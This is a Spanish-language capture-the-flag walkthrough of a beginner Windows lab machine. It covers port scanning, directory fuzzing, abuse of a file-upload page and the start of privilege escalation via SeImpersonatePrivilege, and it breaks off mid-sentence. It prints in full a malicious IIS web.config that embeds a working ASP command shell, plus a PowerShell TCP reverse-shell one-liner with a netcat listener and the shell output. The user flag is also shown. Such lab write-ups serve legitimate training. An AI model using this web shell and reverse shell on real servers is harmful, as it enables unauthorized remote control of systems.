---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Ensalá Papas (Windows) TheHackersLabs (Principiante)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-19 14:03 EDT
Nmap scan report for 192.168.28.4
Host is up (0.00032s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 7.5
|_http-title: IIS7
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49156/tcp open  msrpc         Microsoft Windows RPC
49158/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:7D:13:F9 (Oracle VirtualBox virtual NIC)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
|_clock-skew: -2s
| smb2-time: 
|   date: 2025-03-19T18:04:32
|_  start_date: 2025-03-19T17:50:15
|_nbstat: NetBIOS name: WIN-4QU3QNHNK7E, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:7d:13:f9 (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 66.21 seconds
```

Vemos bastantes cosas interesantes, de primeras si entramos en el puerto `80` veremos una pagina alojada en `IIS7` sin ninguna pagina como tal alojada, esta por defecto, por lo que no veremos mucho:

<figure><img src="../../.gitbook/assets/image (317).png" alt=""><figcaption></figcaption></figure>

Tambien vemos un `SMB`, pero vemos que es un `SMBv2` por lo que no tiene la vulnerabilidad del `EternalBlue`, pero si intentamos enumerar los recursos compartidos del servidor mediante el `SMB` pero veremos que no nos muestra nada por lo menos de forma `anonima`, por lo que vamos a realizar un poco de `fuzzing` hacia el servidor `ISS7`.

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x aspx,asp,html,php,txt -t 100 -k -r 
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.28.4/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,aspx,asp,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/*checkout*.aspx      (Status: 400) [Size: 20]
/zoc.aspx             (Status: 200) [Size: 1159]
/*docroot*.aspx       (Status: 400) [Size: 20]
/*.aspx               (Status: 400) [Size: 20]
/http%3a%2f%2fwww.aspx (Status: 400) [Size: 20]
/http%3a.aspx         (Status: 400) [Size: 20]
/q%26a.aspx           (Status: 400) [Size: 20]
/**http%3a.aspx       (Status: 400) [Size: 20]
/*http%3a.aspx        (Status: 400) [Size: 20]
/http%3a%2f%2fyoutube.aspx (Status: 400) [Size: 20]
/http%3a%2f%2fblogs.aspx (Status: 400) [Size: 20]
/http%3a%2f%2fblog.aspx (Status: 400) [Size: 20]
/**http%3a%2f%2fwww.aspx (Status: 400) [Size: 20]
/s%26p.aspx           (Status: 400) [Size: 20]
/%3frid%3d2671.aspx   (Status: 400) [Size: 20]
/devinmoore*.aspx     (Status: 400) [Size: 20]
/children%2527s_tent.aspx (Status: 400) [Size: 20]
/how_to%2e%2e%2e.aspx (Status: 400) [Size: 20]
/wanted%2e%2e%2e.aspx (Status: 400) [Size: 20]
/200109*.aspx         (Status: 400) [Size: 20]
/*sa_.aspx            (Status: 400) [Size: 20]
/*dc_.aspx            (Status: 400) [Size: 20]
/help%2523drupal.aspx (Status: 400) [Size: 20]
/http%3a%2f%2fcommunity.aspx (Status: 400) [Size: 20]
/chamillionaire%20%26%20paul%20wall-%20get%20ya%20mind%20correct.aspx (Status: 400) [Size: 20]
/clinton%20sparks%20%26%20diddy%20-%20dont%20call%20it%20a%20comeback%28ruzty%29.aspx (Status: 400) [Size: 20]
/dj%20haze%20%26%20the%20game%20-%20new%20blood%20series%20pt.aspx (Status: 400) [Size: 20]
/http%3a%2f%2fradar.aspx (Status: 400) [Size: 20]
/q%26a2.aspx          (Status: 400) [Size: 20]
/login%3f.aspx        (Status: 400) [Size: 20]
/shakira%20oral%20fixation%201%20%26%202.aspx (Status: 400) [Size: 20]
/%22britney%20spears%22.aspx (Status: 500) [Size: 3276]
/%22james%20kim%22.aspx (Status: 500) [Size: 3276]
/%22julie%20roehm%22.aspx (Status: 500) [Size: 3276]
/http%3a%2f%2fjeremiahgrossman.aspx (Status: 400) [Size: 20]
/http%3a%2f%2fweblog.aspx (Status: 400) [Size: 20]
/http%3a%2f%2fswik.aspx (Status: 400) [Size: 20]
Progress: 1245858 / 1245864 (100.00%)
===============================================================
Finished
===============================================================
```

Vemos varias rutas, pero entre ellas la que nos interesa es la del `200 OK` que es el archivo llamado `/zoc.aspx`, si entramos en el veremos lo siguiente:

<figure><img src="../../.gitbook/assets/image (318).png" alt=""><figcaption></figcaption></figure>

Vemos que podemos subir un archivo, por lo que vamos a intentar subir un `.aspx` de forma que se pueda ejecutar codigo remoto hacia el servidor con una interfaz en el archivo para que se vea todas las salidas de comandos de forma comoda y de ahi poder entrar a la maquina con una `reverse shell`.

Pero si intentamos subir el archivo nos dara error ya que esta validando el tipo de archivo que se esta subiendo, pero si inspeccionamos la pagina veremos el siguiente comentario:

```html
<!-- /Subiditosdetono -->
```

Si entramos en el como directorio web, veremos lo siguiente:

<figure><img src="../../.gitbook/assets/image (319).png" alt=""><figcaption></figcaption></figure>

Vemos que hay un archivo `web.config` que si entramos veremos que nos da un error ya que el archivo no esta, pero podemos crear un archivo llamado asi y meter la configuracion para que podamos ejecutar comandos de forma remota.

Tras investigar mucho encontre en la pagina de `HackTricks` un ejemplo de `web.config` que contiene lo siguiente:

> web.config

```aspx
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!--
<% Response.write("-"&"->")%>
<%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")

Function getCommandOutput(theCommand)
    Dim objShell, objCmdExec
    Set objShell = CreateObject("WScript.Shell")
    Set objCmdExec = objshell.exec(thecommand)

    getCommandOutput = objCmdExec.StdOut.ReadAll
end Function
%>

<BODY>
<FORM action="" method="GET">
<input type="text" name="cmd" size=45 value="<%= szCMD %>">
<input type="submit" value="Run">
</FORM>

<PRE>
<%= "\\" & oScriptNet.ComputerName & "\" & oScriptNet.UserName %>
<%Response.Write(Request.ServerVariables("server_name"))%>
<p>
<b>The server's port:</b>
<%Response.Write(Request.ServerVariables("server_port"))%>
</p>
<p>
<b>The server's software:</b>
<%Response.Write(Request.ServerVariables("server_software"))%>
</p>
<p>
<b>The server's software:</b>
<%Response.Write(Request.ServerVariables("LOCAL_ADDR"))%>
<% szCMD = request("cmd")
thisDir = getCommandOutput("cmd /c" & szCMD)
Response.Write(thisDir)%>
</p>
<br>
</BODY>



<%Response.write("<!-"&"-") %>
-->
```

URL = [web.config Example Info](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/iis-internet-information-services.html)

URL = [Download web.config](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config)

Ahora lo subiremos desde el archivo `/zoc.aspx` y nos pondra lo siguiente:

<figure><img src="../../.gitbook/assets/image (320).png" alt=""><figcaption></figcaption></figure>

Ahora si nos vamos a la siguiente ruta para cargar el archivo `web.config` con nuestro `payload`.

```
URL = http://<IP>/Subiditosdetono/web.config
```

Si entramos ahi veremos lo siguiente:

<figure><img src="../../.gitbook/assets/image (321).png" alt=""><figcaption></figcaption></figure>

Vemos que el archivo esta cargando de forma correcta, ahora vamos a probar a meter un comando, por ejemplo `whoami` y veremos esto:

```
win-4qu3qnhnk7e\info
```

Vemos que esta funcionando de forma correcta, por lo que vamos a ingresar el siguiente `payload` para obtener una `shell` con la maquina victima.

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

Antes de ejecutar esto en la pagina, nos pondremos a la escucha:

```shell
nc -lvnp <PORT>
```

Ahora lo enviamos y si volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.28.5] from (UNKNOWN) [192.168.28.4] 49161
PS C:\windows\system32\inetsrv> whoami
win-4qu3qnhnk7e\info
```

Veremos que ha funcionado por lo que leeremos la `flag` del usuario.

> user.txt

```
uigsg5sdfdfbv5b6sad98vcdf
```

## Escalate Privileges

Vamos a ver que privilegios tenemos:

```powershell
whoami /priv
```

Info:

```
INFORMACI?N DE PRIVILEGIOS
--------------------------

Nombre de privilegio          Descripci?n                                  Estado       
============================= ============================================ =============
SeChangeNotifyPrivilege       Omitir comprobaci?n de recorrido             Habilitada   
SeImpersonatePrivilege        Suplantar a un cliente tras la autenticaci?n Habilitada   
SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso Deshabilitado
```

Vemos que `SeImpersonatePrivilege` esta `habilitado` por lo que podremos
